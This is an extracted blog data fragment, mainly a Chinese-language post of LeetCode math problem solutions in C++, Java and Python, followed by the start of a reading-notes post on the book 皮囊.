晚安。","categories":[{"name":"whisper","slug":"whisper","permalink":"https://www.hrwhisper.me/categories/whisper/"},{"name":"谁的呢喃","slug":"whisper/谁的呢喃","permalink":"https://www.hrwhisper.me/categories/whisper/%E8%B0%81%E7%9A%84%E5%91%A2%E5%96%83/"}],"tags":[{"name":"心情","slug":"心情","permalink":"https://www.hrwhisper.me/tags/%E5%BF%83%E6%83%85/"}]},{"title":"leetcode 数学","slug":"leetcode-math","date":"2015-03-10T04:39:39.000Z","updated":"2021-01-08T13:14:31.766Z","comments":true,"path":"leetcode-math/","link":"","permalink":"https://www.hrwhisper.me/leetcode-math/","excerpt":"本次题解包括 7. Reverse Integer 9. Palindrome Number 43. Multiply Strings 50. Pow(x, n) 65 . Valid Number 66. Plus One 67. Add Binary 149 . Max Points on a Line 166 . Fraction to Recurring Decimal 168 . Excel Sheet Column Title 171. Excel Sheet Column Number 172. Factorial Trailing Zeroes 179 . Largest Number 224. Basic Calculator 227 . Basic Calculator II 233 . Number of Digit One 258. Add Digits 273. Integer to English Words","text":"本次题解包括 7. Reverse Integer 9. Palindrome Number 43. Multiply Strings 50. Pow(x, n) 65 . Valid Number 66. Plus One 67. Add Binary 149 . Max Points on a Line 166 . Fraction to Recurring Decimal 168 . Excel Sheet Column Title 171. Excel Sheet Column Number 172. Factorial Trailing Zeroes 179 . Largest Number 224. Basic Calculator 227 . Basic Calculator II 233 . Number of Digit One 258. Add Digits 273. Integer to English Words 7. Reverse Integer Example 1: 12Input: 123Output: 321 Example 2: 12Input: -123Output: -321 Example 3: 12Input: 120Output: 21 Note: Assume we are dealing with an environment which could only hold integers within the 32-bit signed integer range. For the purpose of this problem, assume that your function returns 0 when the reversed integer overflows. 题目地址：leetcode Reverse Integer 题目大意：给定一个数，要求翻转它。如果结果超过int范围，返回0 思路： 反转的数每次*10加上x %10，x每次除以10直到0为止 C++ 1234567891011class Solution &#123;public: int reverse(int x) &#123; long long t = 0; for( ; x ; x /= 10)&#123; t = t * 10 + x % 10; if (t &gt; INT_MAX || t &lt; INT_MIN) return 0; &#125; return t; &#125;&#125;; Java 1234567891011class Solution &#123; public int reverse(int x) &#123; long t = 0; while(x != 0)&#123; t = t * 10 + x % 10; if (t &gt; Integer.MAX_VALUE t &lt; Integer.MIN_VALUE) return 0; x /= 10; &#125; return (int)t; &#125;&#125; Python python 负数的除法和C++/ java不同。需要先转成整数。 123456789101112131415class Solution(object): def reverse(self, x): &quot;&quot;&quot; :type x: int :rtype: int &quot;&quot;&quot; sign = 1 if x &gt; 0 else -1 x = x * sign t = 0 while x: t = t * 10 + x % 10 x //= 10 t *= sign if t &gt; 0x7fffffff or t &lt; -0x80000000: return 0 return t 9. Palindrome Number Determine whether an integer is a palindrome. Do this without extra space. 题目地址：leetcode Palindrome Number 题意：给定一个数，判断其是否是回文串 思路：此题的定义是负数均不是回文串。直接用数学的方法做即可。（不断的取各个位上的值，看看能否变为原来的数） C++ 12345678910111213class Solution &#123;public: bool isPalindrome(int x) &#123; if(x &lt; 0) return false; long long r_x = 0; int t = x; while(t)&#123; r_x = r_x* 10 + t % 10; t /= 10; &#125; return x == r_x; &#125;&#125;; Python 123456789101112class Solution(object): def isPalindrome(self, x): &quot;&quot;&quot; :type x: int :rtype: bool &quot;&quot;&quot; if x &lt; 0: return False k, p = 0, x while x: k = k * 10 + x % 10 x //= 10 return k == p 43. Multiply Strings Given two non-negative integers num1 and num2 represented as strings, return the product of num1 and num2. Note: The length of both num1 and num2 is &lt; 110. Both num1 and num2 contains only digits 0-9. Both num1 and num2 does not contain any leading zero. You must not use any built-in BigInteger library or convert the inputs to integer directly. 题目地址：leetcode Multiply Strings 题目大意: 给定两个非负的数（因为很大，故用字符串表示），求他们的乘积。 大一的时候就写过高精度乘法了，于是按以前的思路写， 36MS,太慢，看了discuss，觉得自己的代码被虐得渣都不剩。于是改进如下: C++ 9ms 123456789101112131415161718192021222324class Solution &#123;public: string multiply(string num1, string num2) &#123; int m = num1.length(), n = num2.length(); if (num1 == &quot;0&quot; || num2 == &quot;0&quot;) return &quot;0&quot;; vector&lt;int&gt; res(m + n, 0); reverse(begin(num1), end(num1)); reverse(begin(num2), end(num2)); for (int i = 0; i &lt; m; i++) for (int j = 0, id = i; j &lt; n; j++) res[id++] += (num1[i] - 48)*(num2[j]-48); int carry = 0; for (int i = 0; i &lt; n + m; i++)&#123; int temp = res[i]; res[i] = (temp + carry) % 10; carry = (temp + carry) / 10; &#125; string ans(n + m, &#x27;0&#x27;); for (int i = m + n - 1 ,k=0; i &gt;= 0; i--) ans[k++] = res[i]+48; int id = ans.find_first_not_of(&#x27;0&#x27;); return ans.substr(id); &#125;&#125;; Python 字符串没有reverse，但是可以用切片 num1[::-1] 就是反转了。 123456789101112131415161718192021class Solution: # @param num1, a string # @param num2, a string # @return a string def multiply(self, num1, num2): if num1==&#x27;0&#x27; or num2==&#x27;0&#x27;: return &#x27;0&#x27; n,m = len(num1),len(num2) num1 ,num2 = num1[::-1] , num2[::-1] res=[0]*(n+m) for i in range(0,n): id = i for j in range(0,m): res[id] ,id = res[id]+int(num1[i]) * int(num2[j]),id+1 carry = 0 for i in range(0,n+m): res[i] , carry =(res[i]+carry) % 10,(res[i]+carry) /10 ans=&quot;&quot; for i in xrange(n+m-1,-1,-1): ans += str(res[i]) for i in range(n+m): if ans[i] != &#x27;0&#x27;: break return ans[i:] C++ 版本2 123456789101112131415161718192021222324252627class Solution &#123;public: string multiply(string num1, string num2) &#123; reverse(num1.begin(), num1.end()); reverse(num2.begin(), num2.end()); vector&lt;int&gt; ans(num1.size() + num2.size(), 0); for(int i = 0; i &lt; num1.size(); ++i) for(int j = 0; j &lt; num2.size(); ++j) ans[i + j] += (num1[i] - &#x27;0&#x27;) * (num2[j] - &#x27;0&#x27;); int carry = 0; for(int i = 0; i &lt; ans.size(); ++i)&#123; ans[i] += carry; carry = ans[i] / 10; ans[i] %= 10; &#125; int tail = ans.size() - 1; while(tail &gt; 0 &amp;&amp; ans[tail] == 0) --tail; string res; for(int i = tail; i &gt;= 0; --i) res += ans[i] + &#x27;0&#x27;; return res; &#125;&#125;; 50. leetcode Pow(x, n) Implement pow(x, n). Example 1: Input: 2.00000, 10 Output: 1024.00000 Example 2: Input: 2.10000, 3 Output: 9.26100 题目地址：leetcode Pow(x, n) 题目大意: 给定x，求x的n次方 思路：直接快速幂即可。注意n可能为负数!因此 WA了一次 C++ 12345678910111213141516171819class Solution &#123;public: double myPow(double x, int n) &#123; bool neg = false; long long t = n; if(n &lt; 0)&#123; neg = true; t = -t; &#125; double ans = 1; while(t)&#123; if(t &amp; 1) ans *= x; x *= x; t &gt;&gt;= 1; &#125; return neg? 1.0 / ans : ans; &#125;&#125;; Python 1234567891011121314151617class Solution(object): def myPow(self, x, n): &quot;&quot;&quot; :type x: float :type n: int :rtype: float &quot;&quot;&quot; if n &lt; 0: n = -n x = 1.0 / x ans = 1 while n &gt; 0: if n &amp; 1: ans *= x x *= x n &gt;&gt;= 1 return ans 也可以 12345678910111213141516class Solution(object): def myPow(self, x, n): &quot;&quot;&quot; :type x: float :type n: int :rtype: float &quot;&quot;&quot; neg = n &lt; 0 if neg: n = -n ans = 1 while n: if n &amp; 1: ans *= x x *= x n &gt;&gt;= 1 return 1.0 / ans if neg else ans 65. leetcode Valid Number Validate if a given string is numeric. Some examples: \"0\" =&gt; true \" 0.1 \" =&gt; true \"abc\" =&gt; false \"1 a\" =&gt; false \"2e10\" =&gt; true Note: It is intended for the problem statement to be ambiguous. You should gather all requirements up front before implementing one. 题目地址: leetcode Valid Number 题意：给定字符串，判断该字符串是否是合法的数字 思路：首先吐槽Leetcode没有说明什么是合法的数字。 比如 .5和5.测试中应该都是true的，我自己觉得应该是false。 注意点有： 开始和结束可以有若干个空格 数字最开始前面可能有+ 或者-号 指数 e前面要有数字，之后的数字必须为整数，e后面可能有一个+或者-号 ' . '前或者后要有数字。不能单纯的一个点。 我的写法是，首先先清除前后的空格，方法是对下标进行加减。 之后扫描数组：， 如果s[i]不是数字： s[i]=='e' 之前不能出现e，之前必须有数字。并且判断下一个数是否为'+' or '-' s[i]=='.' .之前不能有. ， 并且 e没有出现（否则为如5e6.5这种形式） return false s[i]是数字： 标记e和p之前出现了数字 根据e和p是否出现标记之后是否出现数字。 扫描数组完毕，需对e之后是否有数字和p之前或者之后是否有数字进行判断。 C++ 12345678910111213141516171819202122232425262728293031323334class Solution &#123;public: bool isNumber(string s) &#123; int i = 0, n = s.length(); while (n &gt; 0 &amp;&amp; s[n - 1] == &#x27; &#x27;) n--; if (!n) return false; while (i &lt;n &amp;&amp;s[i] == &#x27; &#x27;) i++; if (s[i] == &#x27;-&#x27; || s[i] == &#x27;+&#x27;) i++; bool e = false, point = false; bool numBeforeE = false, numAfterE = false; bool numBeforeP = false, numAfterP = false; for (; i &lt; n; i++)&#123; if (s[i] &gt; &#x27;9&#x27; || s[i] &lt; &#x27;0&#x27;)&#123; if (s[i] == &#x27;e&#x27; &amp;&amp; !e &amp;&amp; numBeforeE)&#123; e = true; if (i + 1 &lt; n &amp;&amp; (s[i + 1] == &#x27;-&#x27; || s[i + 1] == &#x27;+&#x27;)) i++; continue; &#125; if (s[i] == &#x27;.&#x27; &amp;&amp; !point &amp;&amp;!e)&#123; point = true; continue; &#125; return false; &#125; numBeforeP = numBeforeE = true; if (e) numAfterE = true; if (point) numAfterP = true; &#125; if (e &amp;&amp; !numAfterE) return false; if (point &amp;&amp; !numAfterP &amp;&amp; !numBeforeP) return false; return true; &#125;&#125;; Python 123456789101112131415161718192021222324252627282930313233class Solution: # @param s, a string # @return a boolean def isNumber(self, s): i , n = 0 , len(s) while n &gt; 0 and s[n-1]==&#x27; &#x27;: n-=1 if not n : return False while i &lt; n and s[i]==&#x27; &#x27;: i+=1 if s[i] == &#x27;-&#x27; or s[i] == &#x27;+&#x27; : i+=1 e, numBeforeE ,numAfterE = False,False,False p ,numBeforeP, numAfterP = False,False,False while i &lt; n: if s[i] &lt; &#x27;0&#x27; or s[i] &gt; &#x27;9&#x27;: if s[i]==&#x27;e&#x27; and not e and numBeforeE: e=True if i + 1 &lt; n and (s[i+1]==&#x27;+&#x27; or s[i+1]==&#x27;-&#x27;): i += 1 i += 1 continue if s[i]==&#x27;.&#x27; and not p and not e: p=True i += 1 continue return False numBeforeE,numBeforeP=True,True if e: numAfterE=True if p: numAfterP=True i += 1 if (e and not numAfterE )or\\ (p and not numBeforeP and not numAfterP): return False return True 66. Plus One Given a non-negative number represented as an array of digits, plus one to the number. The digits are stored such that the most significant digit is at the head of the list. 题目地址：leetcode Plus One 题目大意: 给一个数，然后要你从把这个数加一。 思路：注意进位什么的就好了。太水不说了 C++ 123456789101112131415class Solution &#123;public: vector&lt;int&gt; plusOne(vector&lt;int&gt; &amp;digits) &#123; int carry = 1, n = digits.size(); vector&lt;int&gt; ans(n, 0); for (int i = 0; i &lt; n; i++)&#123; ans[i] = (carry + digits[n - i - 1]) % 10; carry = (carry + digits[n - i - 1]) / 10; &#125; if (carry) ans.push_back(carry); reverse(ans.begin(), ans.end()); return ans; &#125;&#125;; Python 123456789101112class Solution: # @param digits, a list of integer digits # @return a list of integer digits def plusOne(self, digits): carry , n = 1 , len(digits) ans = [0 for i in range(n)] for i in range(n): ans[i]= (carry+digits[n-i-1]) % 10 carry = (carry+digits[n-i-1]) / 10 if carry : ans.append(carry) return ans[::-1] 67. Add Binary Given two binary strings, return their sum (also a binary string). For example, a = \"11\" b = \"1\" Return \"100\". 题目地址：leetcode Add Binary 题目大意 两个二进制数加法 思路：和高精度加法差不多。只是mod 2而已 C++ 1234567891011121314151617181920212223class Solution &#123;public: string addBinary(string a, string b) &#123; int carry = 0; string ans; for (int i = a.size() - 1, j = b.size() - 1; i &gt;= 0 || j &gt;= 0; --i, --j) &#123; int t = carry; if (i &gt;= 0) t += a[i] - &#x27;0&#x27;; if (j &gt;= 0) t += b[j] - &#x27;0&#x27;; if (t &gt;= 2) &#123; t -= 2; carry = 1; &#125; else carry = 0; ans = static_cast&lt;char&gt;(t + &#x27;0&#x27;) + ans; &#125; if (carry) ans = static_cast&lt;char&gt;(carry + &#x27;0&#x27;) + ans; return ans; &#125;&#125;; Python 12345678910111213141516171819202122class Solution: # @param a, a string # @param b, a string # @return a string def addBinary(self, a, b): m , n = len(a) , len(b) if m &lt; n : return self.addBinary(b,a) a , b = a[::-1] ,b[::-1] ans = [0 for i in range(m)] carry = 0 for i in range(n): ans[i] = (carry + int(a[i]) + int(b[i])) %2 carry = (carry + int(a[i]) + int(b[i])) /2 for i in range(n,m): ans[i] = (carry + int(a[i])) %2 carry = (carry + int(a[i])) /2 if carry : ans.append(carry) ans=ans[::-1] return &#x27;&#x27;.join(str(i) for i in ans) 149. Max Points on a Line Given n points on a 2D plane, find the maximum number of points that lie on the same straight line. 题目地址: leetcode Max Points on a Line 题意：给定一个平面上的n个点，找出以他们构成的直线上点最多的数目 思路：对于每个点i，对剩余的所有其他点j进行枚举，同时用hash表记录斜率对应的个数 i和j坐标相等，标记同样的点+1 i和j横坐标相等，标记斜率无穷大+1 i和j横坐标不相等，计算斜率 初始值 same 为0 ，内循环从i开始就已经包括了初始结点~ 1234567891011121314151617181920212223242526class Solution: # @param points, a list of Points # @return an integer def maxPoints(self, points): if not points: return 0 dic, n = &#123;&#125;, len(points) ans = 1 for i in xrange(n): same, p = 0, 0 for j in xrange(i, n): if points[i].x == points[j].x and points[i].y == points[j].y: same += 1 continue elif points[i].x != points[j].x: p = (points[j].y - points[i].y) * 1.0 / (points[j].x - points[i].x) else: p = float(&#x27;inf&#x27;) if p in dic: dic[p] = dic[p] + 1 else: dic[p] = 1 ans = max(ans, same) for j in dic: ans = max(ans, dic[j] + same) dic = &#123;&#125; return ans 或者这样写： 1234567891011121314151617181920212223242526class Solution: # @param points, a list of Points # @return an integer def maxPoints(self, points): if not points: return 0 dic, n = &#123;&#125;, len(points) ans = 1 for i in xrange(n): same, p = 1, 0 for j in xrange(i + 1, n): if points[i].x == points[j].x and points[i].y == points[j].y: same += 1 continue elif points[i].x != points[j].x: p = (points[j].y - points[i].y) * 1.0 / (points[j].x - points[i].x) else: p = float(&#x27;inf&#x27;) if p in dic: dic[p] += 1 else: dic[p] = 1 ans = max(ans, same) for j in dic: ans = max(ans, dic[j] + same) dic = &#123;&#125; return ans 166. Fraction to Recurring Decimal Given two integers representing the numerator and denominator of a fraction, return the fraction in string format. If the fractional part is repeating, enclose the repeating part in parentheses. For example, Given numerator = 1, denominator = 2, return \"0.5\". Given numerator = 2, denominator = 1, return \"2\". Given numerator = 2, denominator = 3, return \"0.(6)\". 题目地址: leetcode Fraction to Recurring Decimal 题意：给定分子和分母，求分子除以分母的值。要求，如果出现无限循环小数，应该在循环体上加()，如2/3表示为0.（6） 思路:难点在于如何判断无限循环。我们先在草稿纸上模拟下除法运算，你试试1/7，你会发现，当余数重新变为1时，已经开始循环。此时，可以读取之前的存下的循环位置。（用Hash） 12345678910111213141516171819202122class Solution: # @return a string def fractionToDecimal(self, numerator, denominator): if not numerator: return &#x27;0&#x27; ans =&#x27;&#x27; if (numerator &lt; 0) ^ (denominator &lt;0): ans+=&#x27;-&#x27; a , b = abs(numerator),abs(denominator) ans += str(a / b) rem = a % b if not rem: return ans ans,dic,rem=ans+&#x27;.&#x27;, &#123;&#125;, rem*10 while rem : if rem in dic: index = dic[rem] ans=ans[:index]+&#x27;(&#x27;+ans[index:]+&#x27;)&#x27; return ans dic[rem]=len(ans) ans+=str(rem / b) rem = (rem %b)*10 return ans 168. Excel Sheet Column Title Given a positive integer, return its corresponding column title as appear in an Excel sheet. For example: 12345671 -&gt; A2 -&gt; B3 -&gt; C...26 -&gt; Z27 -&gt; AA28 -&gt; AB 题目地址: leetcode Excel Sheet Column Title 题意：给定一个数字n,让你转化为EXCEL的列号 思路：其实就是26进制，不过是没有0 的。故每次n-1转化26进制即可 12345678class Solution: # @return a string def convertToTitle(self, num): ans = [] while num &gt;0: ans.append((num-1)%26) num = (num-1)/26 return &#x27;&#x27;.join(chr(i+ord(&#x27;A&#x27;)) for i in ans[::-1]) 171. Excel Sheet Column Number Related to question Excel Sheet Column Title Given a column title as appear in an Excel sheet, return its corresponding column number. For example: 1234567A -&gt; 1B -&gt; 2C -&gt; 3...Z -&gt; 26AA -&gt; 27AB -&gt; 28 题目地址: leetcode Excel Sheet Column Number 题意：给定excel列号，转化为是第几列。 思路：就是上一题转化过来嘛。。 12345678class Solution: # @param s, a string # @return an integer def titleToNumber(self, s): ans , n &#x3D; 0 ,len(s) for i in xrange(n): ans +&#x3D; (ord(s[i])-64) * ( 26**(n-i-1)) return ans 172. Factorial Trailing Zeroes Given an integer n, return the number of trailing zeroes in n!. Note: Your solution should be in logarithmic time complexity. 题目地址: leetcode Factorial Trailing Zeroes 题意：给定n,返回n!末尾0的个数 思路：末尾0只能由因子2*5组成，而2的数目大于5，故只需要考虑5的个数。 不能直接n/5得到答案。n=25时候，n!有6个5！为什么？因为25贡献了2个5，而之前的5,10,15,20各一个，也就是说，我们要一直除以5，直到没有5的因子。 12345678class Solution: # @return an integer def trailingZeroes(self, n): ans &#x3D; 0 while n: ans +&#x3D; n&#x2F;5 n&#x2F;&#x3D;5 return ans 看到了别人利用递归一行的代码。。 1234class Solution: # @return an integer def trailingZeroes(self, n): return 0 if n &lt; 5 else n&#x2F;5 + self.trailingZeroes(n&#x2F;5) 179. Largest Number Given a list of non negative integers, arrange them such that they form the largest number. For example, given [3, 30, 34, 5, 9], the largest formed number is 9534330. Note: The result may be very large, so you need to return a string instead of an integer. 题目地址: leetcode Largest Number 题意：给定一个数组，求数组中的数字连接成的字符串能组成最大的数字是多少。 思路：很显然，排序，不过需要注意的是[121,12] 如果按从小到大的话，确实应该是121&lt;12，why?因为12112（121 &gt; 12) 和12121(121&lt;12)显然后者更大。 但是[129,12]则是129大，其实只要将他们拼接起来比较即可。 需要注意的是[0,0]返回0 C++ 12345678910111213141516class Solution &#123;public: string largestNumber(vector&lt;int&gt;&amp; nums) &#123; vector&lt;string&gt; strNums(nums.size()); for (int i = 0; i &lt; nums.size(); i++) strNums[i] = to_string(nums[i]); sort(strNums.begin(), strNums.end(), [](const string&amp; a, const string &amp;b) &#123;return a + b &gt; b + a; &#125;); int i = 0; while (i &lt; strNums.size() - 1 &amp;&amp; strNums[i] == &quot;0&quot;) i++ ; string ans; for (; i &lt; strNums.size(); i ++) ans += strNums[i]; return ans; &#125;&#125;; Java 1234567891011121314151617class Solution &#123; public String largestNumber(int[] nums) &#123; String[] strNums = new String[nums.length]; for (int i = 0; i &lt; nums.length; i++) strNums[i] = String.valueOf(nums[i]); Arrays.sort(strNums, (o1, o2) -&gt; (o2 + o1).compareTo(o1 + o2)); int i = 0; while (i &lt; strNums.length - 1 &amp;&amp; strNums[i].equals(&quot;0&quot;)) i++; StringBuilder ans = new StringBuilder(); for (; i &lt; strNums.length; i++) ans.append(strNums[i]); return ans.toString(); &#125;&#125; Python 12345678class Solution: def largestNumber(self, nums): &quot;&quot;&quot; :type input: List[int] :rtype: str &quot;&quot;&quot; if not any(map(bool, nums)):return &#x27;0&#x27; return &#x27;&#x27;.join(sorted(list(map(str, nums)), cmp = (lambda a, b: 1 if a + b &lt; b + a else -1))) 224. Basic Calculator Implement a basic calculator to evaluate a simple expression string. The expression string may contain open ( and closing parentheses ), the plus + or minus sign -, non-negative integers and empty spaces . You may assume that the given expression is always valid. Some examples: 123&quot;1 + 1&quot; &#x3D; 2&quot; 2-1 + 2 &quot; &#x3D; 3&quot;(1+(4+5+2)-3)+(6+8)&quot; &#x3D; 23 Note: Do not use the eval built-in library function. 题目地址：leetcode Basic Calculator 题目大意：给定一个带有括号的算数表达式，其中包含 + - 两种运算符，求其解 思路: 用栈 。 遇到 (就把之前的结果和符号放入栈中 Python 1234567891011121314151617181920212223242526272829303132class Solution(object): def calculate(self, s): &quot;&quot;&quot; :type s: str :rtype: int &quot;&quot;&quot; s = s.strip() stack = [] sign = 1 n = len(s) ans = num = 0 for i in xrange(n): if s[i] == &#x27; &#x27; and i != n - 1: continue if &#x27;0&#x27; &lt;= s[i] &lt;= &#x27;9&#x27;: num = num * 10 + ord(s[i]) - 48 if s[i] in [&#x27;+&#x27;, &#x27;-&#x27;, &#x27;(&#x27;, &#x27;)&#x27;] or i == n - 1: if s[i] == &#x27;(&#x27;: stack.append(ans) stack.append(sign) ans = 0 sign = 1 elif s[i] == &#x27;)&#x27;: ans += num * sign sign = stack.pop() num = stack.pop() ans = num + ans * sign sign = 1 else: ans += num * sign sign = 1 if s[i] == &#x27;+&#x27; else -1 num = 0 return ans 227. Basic Calculator II Implement a basic calculator to evaluate a simple expression string. The expression string contains only non-negative integers, +, -, *, / operators and empty spaces . The integer division should truncate toward zero. You may assume that the given expression is always valid. Some examples: 123&quot;3+2*2&quot; &#x3D; 7&quot; 3&#x2F;2 &quot; &#x3D; 1&quot; 3+5 &#x2F; 2 &quot; &#x3D; 5 Note: Do not use the eval built-in library function. 题目地址 ：leetcode Basic Calculator II 题目大意：给定一个+-*/四则运算的表达式，求其解。 思路：设left已经合并的计算结果，right为还未合并的计算结果。 对于+ - 符号，显然不管下一个是啥符号，都可以进行合并。 而 * / 则不可以，因为优先级比较高 类似于：282. Expression Add Operators Python 12345678910111213141516171819202122232425262728class Solution(object): def calculate(self, s): &quot;&quot;&quot; :type s: str :rtype: int &quot;&quot;&quot; n = len(s) left = right = num = 0 sign = &#x27;+&#x27; for i in xrange(n): if s[i] == &#x27; &#x27; and i &lt; n - 1: continue if &#x27;0&#x27; &lt;= s[i] &lt;= &#x27;9&#x27;: num = num * 10 + ord(s[i]) - 48 if s[i] in [&#x27;+&#x27;, &#x27;-&#x27;, &#x27;*&#x27;, &#x27;/&#x27;] or i == n - 1: if sign == &#x27;+&#x27;: left, right = left + right, num elif sign == &#x27;-&#x27;: left, right = left + right, -num elif sign == &#x27;*&#x27;: right *= num else: right = right / num if right &gt;= 0 else -(-right / num) # -3 /2 in python is -2 num = 0 sign = s[i] return left + right 233. Number of Digit One Given an integer n, count the total number of digit 1 appearing in all non-negative integers less than or equal to n. For example: Given n = 13, Return 6, because digit 1 occurred in the following numbers: 1, 10, 11, 12, 13. Hint: Beware of overflow. 题目地址：leetcode Number of Digit One 题意：给定一个整数n，求不超过它的所有非负整数中，包含1的个数。 思路： 方法1. 我们可以先算出1位数、2位数、 x位数上1的个数。 比如一位数的时候，n = 9 有1个（只有1），两位数的时候99 -&gt;20 ，是1X和X1的和，1X有0~9 10个1（只看个位），X1 同样的0~9 10个1（只看十位） 三位数n = 999 有300个 100 + 10*20 (1XX 100个，个位和十位的每100有20个) 也就是有递推公式： dp[i] = 10^i + 10 * dp[i-1] （个位的时候i=0） 那么不是恰好的数呢？比如133 3 -&gt; 1 33 -&gt; 10 + 3 * 1 + 1= 14 （1X的情况加上1~30的情况，加上不到40然而有一个31多了一个） 133 -&gt; 34 + 20 + 14 再比如 233 233 -&gt; 100 + 20*2 +14 = 154 也就是当前位大于1的情况就是 10^i 个，等于1的情况则则看比 10^i 多出多少个， 然后再加上 int(n[i]) * dp[i - 1] + cnt[i - 1] （比它小的10的倍数和不足的能凑成多少个） 解释起来好麻烦。 直接看代码吧 123456789101112131415161718192021222324class Solution(object): def countDigitOne(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; if n &lt;= 0: return 0 dp = [1] * 11 cnt = [1 if n % 10 &gt; 0 else 0] + [0] * 10 n = str(n)[::-1] # str n and reverse n_len = len(n) num = n[0] for i in range(1, n_len): dp[i] = 10 ** i + 10 * dp[i - 1] num = n[i] + num if n[i] &gt;= &#x27;2&#x27;: cnt[i] = 10 ** i elif n[i] == &#x27;1&#x27;: cnt[i] = int(num) - (10 ** i) + 1 cnt[i] += int(n[i]) * dp[i - 1] + cnt[i - 1] return cnt[n_len - 1] 方法2： 这是discuss里的方法，我自己想的是方法1 主要思想是，把数拆成两部分，枚举各个位置，比如上面提到的133，枚举10位上有多少个1就是将其除以10和对10取模得到13和3左右两部分，接着，要看十位上可以组成多少个1，因为十位数上是3，比1大，说明十位上为1的都满足，则一共可以有20个。01X和11X啊。 再比如，113，通用举十位上的例子，11和3，因为十位数上的为1，只能满足01X的数，剩下的有4个。 就是余数（右部分）+1的结果 代码中用(x+8) / 10 实现了大于等于2的判断，十分巧妙。 C++ 123456789101112typedef long long int LL;class Solution &#123;public: int countDigitOne(int n) &#123; int ans = 0; for (LL k = 1; k &lt;= n; k *= 10) &#123; LL x = n / k, r = n % k; ans += (x + 8) / 10 * k + (x % 10 == 1 ? r + 1 : 0); &#125; return ans; &#125;&#125;; Python 123456789101112class Solution(object): def countDigitOne(self, n): &quot;&quot;&quot; :type n: int :rtype: int &quot;&quot;&quot; ans, k = 0, 1 while k &lt;= n: x, r = n / k, n % k ans += (x + 8) / 10 * k + ((r + 1) if x % 10 == 1 else 0) k *= 10 return ans 258. Add Digits Given a non-negative integer num, repeatedly add all its digits until the result has only one digit. For example: Given num = 38, the process is like: 3 + 8 = 11, 1 + 1 = 2. Since 2 has only one digit, return it. Follow up: Could you do it without any loop/recursion in O(1) runtime? 题目地址：leetcode Add Digits 题意：给定一个数，让你将它每位数相加，然后重复过程，直到和为个位数为止。 思路： 先看模拟法: C++ 1234567891011121314class Solution &#123;public: int addDigits(int num) &#123; while(num &gt; 9)&#123; int sum = 0; while(num)&#123; sum += num %10; num /= 10; &#125; num = sum; &#125; return num; &#125;&#125;; Python 123456789class Solution(object): def addDigits(self, num): while num &gt; 9: sum = 0 while num: sum += num %10 num /= 10 num = sum return num 方法二是查看一下规律。 你把上面的打印1~100就看出来了 Python 12345678class Solution(object): def addDigits(self, num): if num == 0: return 0 elif num % 9 == 0: return 9 else: return num % 9 当然也可以写成公式： C++ 123456class Solution &#123;public: int addDigits(int num) &#123; return num - 9 * ((num - 1) / 9); &#125;&#125;; Python 1234567class Solution(object): def addDigits(self, num): &quot;&quot;&quot; :type num: int :rtype: int &quot;&quot;&quot; return num - 9 * ((num - 1) // 9) if num &gt; 9 else num 273. Integer to English Words Convert a non-negative integer to its english words representation. Given input is guaranteed to be less than 231 - 1. For example, 123123 -&gt; &quot;One Hundred Twenty Three&quot;12345 -&gt; &quot;Twelve Thousand Three Hundred Forty Five&quot;1234567 -&gt; &quot;One Million Two Hundred Thirty Four Thousand Five Hundred Sixty Seven&quot; Hint: Did you see a pattern in dividing the number into chunk of words? For example, 123 and 123000. Group the number by thousands (3 digits). You can write a helper function that takes a number less than 1000 and convert just that chunk to words. There are many edge cases. What are some good test cases? Does your code work with input such as 0? Or 1000010? (middle chunk is zero and should not be printed out) 题目地址：leetcode Integer to English Words 题意：给定一个非负的整数，用英语表示它。 思路： 分成3组，int型最多迭代4次。。我直接迭代干掉它了。。。 也可以递归。 12345678910111213141516171819202122232425262728293031323334353637class Solution(object): def numberToWords(self, n): &quot;&quot;&quot; :type num: int :rtype: str &quot;&quot;&quot; if n == 0: return &quot;Zero&quot; lower_twenty = [&quot;Zero&quot;, &quot;One&quot;, &quot;Two&quot;, &quot;Three&quot;, &quot;Four&quot;, &quot;Five&quot;, &quot;Six&quot;, &quot;Seven&quot;, &quot;Eight&quot;, &quot;Nine&quot;, &quot;Ten&quot;, &quot;Eleven&quot;, &quot;Twelve&quot;, &quot;Thirteen&quot;, &quot;Fourteen&quot;, &quot;Fifteen&quot;, &quot;Sixteen&quot;, &quot;Seventeen&quot;, &quot;Eighteen&quot;, &quot;Nineteen&quot;] twenty_to_100 = [&quot;Twenty&quot;, &quot;Thirty&quot;, &quot;Forty&quot;, &quot;Fifty&quot;, &quot;Sixty&quot;, &quot;Seventy&quot;, &quot;Eighty&quot;, &quot;Ninety&quot;] other = [&quot;&quot;, &quot;Thousand&quot;, &quot;Million&quot;, &quot;Billion&quot;] ans = &quot;&quot; for k in xrange(4): if n == 0: break res = &quot;&quot; num, n = n % 1000, n / 1000 if num &gt;= 100: x, num = num / 100, num % 100 res += lower_twenty[x] + &quot; Hundred&quot; if num &gt; 0: if res: res += &quot; &quot; if num &lt; 20: res += lower_twenty[num] else: # num &gt;= 20 t, num = num / 10 - 2, num % 10 res += twenty_to_100[t] if num != 0: res += &quot; &quot; + lower_twenty[num] if res: ans = res + ((&quot; &quot; + other[k]) if k else &quot;&quot;) + ((&quot; &quot; + ans) if ans else &quot;&quot;) return ans 更多题解可以查看： https://www.hrwhisper.me/leetcode-algorithm-solution/","categories":[{"name":"code","slug":"code","permalink":"https://www.hrwhisper.me/categories/code/"},{"name":"Leetcode","slug":"code/Leetcode","permalink":"https://www.hrwhisper.me/categories/code/Leetcode/"}],"tags":[{"name":"算法","slug":"算法","permalink":"https://www.hrwhisper.me/tags/%E7%AE%97%E6%B3%95/"}]},{"title":"『读书笔记』皮囊","slug":"reading-notes-pinang-caichongda","date":"2015-03-08T07:49:17.000Z","updated":"2020-10-22T15:00:06.524Z","comments":true,"path":"reading-notes-pinang-caichongda/","link":"","permalink":"https://www.hrwhisper.me/reading-notes-pinang-caichongda/","excerpt":"昨天，蔡崇达先生去福州大学演讲《你是否曾被梦想伤害》 可惜在RUC，没能去上。 还好舍友要到了签名","text":"昨天，蔡崇达先生去福州大学演讲《你是否曾被梦想伤害》 可惜在RUC，没能去上。 还好舍友要到了签名 如果皮囊朽坏，我们还剩下什么？ 好吧，你告诉我，还有灵魂。 不管这具皮囊是什么质地，它包裹着一颗心。人生或许就是一具皮囊打包携带着一颗心的羁旅。 这颗心很多时候是睡去了，有时醒来。心醒着的时候，就把皮囊从内部照亮。 荒野中就有了许多灯笼，灯和灯由此辨认。心和心，人和人由此辨认。 